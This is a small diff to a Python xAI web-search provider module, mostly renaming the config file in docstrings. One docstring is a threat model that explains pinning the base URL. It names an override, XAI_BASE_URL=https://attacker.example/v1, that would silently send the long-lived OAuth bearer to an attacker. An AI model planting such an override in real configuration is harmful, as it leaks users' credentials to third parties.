@@ -12,7 +12,7 @@ Reference: https://docs.x.ai/developers/tools/web-search
 Search only. Hermes pairs it with Firecrawl / Tavily for ``web_extract``; MISAKA reaches
 pages through ``web_fetch``, so there is nothing to pair with.
 
-Config keys this provider responds to (``~/.misaka/web.json``)::
+Config keys this provider responds to (the ``web`` section of ``settings.json``)::
 
     "search_backend": "xai"      # explicit per-capability
     "backend": "xai"             # shared fallback
@@ -106,7 +106,7 @@ def _auth_path() -> str:
 
 
 def _xai_config() -> dict[str, Any]:
-    """Read the ``xai`` section of ``web.json`` (``{}`` on miss).
+    """Read the ``xai`` map of the ``web`` settings section (``{}`` on miss).
 
     Hermes' ``_load_xai_web_config``, reading ``web.xai`` from ``config.yaml``.
     """
@@ -197,7 +197,7 @@ def _inference_base_url(*, pin_origin: bool) -> str:
     ``tools/xai_http.py`` on the ``xai-oauth`` branch only. The threat it names is this
     one: the xAI OAuth bearer is a long-lived credential tied to a SuperGrok / X Premium
     subscription, and a tampered ``.env``, a hostile shell init, or -- here, where the
-    override is wider than Hermes' -- a ``web.json`` written by other tooling could set
+    override is wider than Hermes' -- a ``settings.json`` written by other tooling could set
     ``XAI_BASE_URL=https://attacker.example/v1`` and ship that bearer to a third party on
     every search, silently. ``http://`` would ship it in cleartext as well.
 
